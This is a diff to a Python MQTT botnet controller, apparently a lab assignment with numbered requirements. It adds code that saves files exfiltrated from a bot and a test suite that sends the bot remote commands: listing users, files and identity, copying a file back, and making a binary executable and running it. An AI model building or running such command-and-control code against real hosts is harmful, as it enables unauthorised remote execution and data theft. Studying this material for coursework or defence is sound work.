@@ -6,9 +6,16 @@ from consts import *
 def on_message(client, userdata, msg):
     #accept messages taht go lik this : f"{BOT_ID}_RES:
     payload = msg.payload.decode()
-    if payload.startswith(f"{BOT_ID}_RES:") or payload.startswith(f"{BOT_ID}_ERR:"):
-        print(f"[BOT RESPONSE]: {payload}")
-
+    if payload.startswith(f"{BOT_ID}_RES:"):
+        clean_payload = payload.replace(f"{BOT_ID}_RES: ", "")
+        # Check if the response contains file data
+        if clean_payload.startswith("FILE_DATA:"):
+            _, filename, content = clean_payload.split(":", 2)
+            with open(f"downloaded_{filename}", "w") as f:
+                f.write(content)
+            print(f"[SYSTEM]: File {filename} copied and saved as downloaded_{filename}")
+        else:
+            print(f"[BOT RESPONSE]: {clean_payload}")
 
 if __name__ == '__main__':
     client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
@@ -27,12 +34,13 @@ if __name__ == '__main__':
             if cmd == "testall":
                 print("Testing all Requirements...")
                 test_suite = [
-                    CMD_ANNOUNCE_BOT,
-                    CMD_WHO_IS_LOGGED_IN,
-                    CMD_LIST_FILES,
-                    CMD_ID_HOST,
-                    CMD_GET_FILE_CONTENT + " testFileToExecute.sh",
-                    "./testFileToExecute.sh"
+                    CMD_ANNOUNCE_BOT, # botStatus, requirement 5.1
+                    CMD_WHO_IS_LOGGED_IN, # w, requirement 5.2
+                    CMD_LIST_FILES, # ls, requirement 5.3
+                    CMD_ID_HOST, # id, requirement 5.4
+                    CMD_COPY_FROM_BOT_TO_CONTROLLER + "fileToCopy.txt",  # requirement 5.5
+                    CMD_CHMOD_TEST_BINARY, # requirement 5.6
+                    CMD_RUN_TEST_BINARY # requirement 5.6
                 ]
 
                 for test in test_suite:
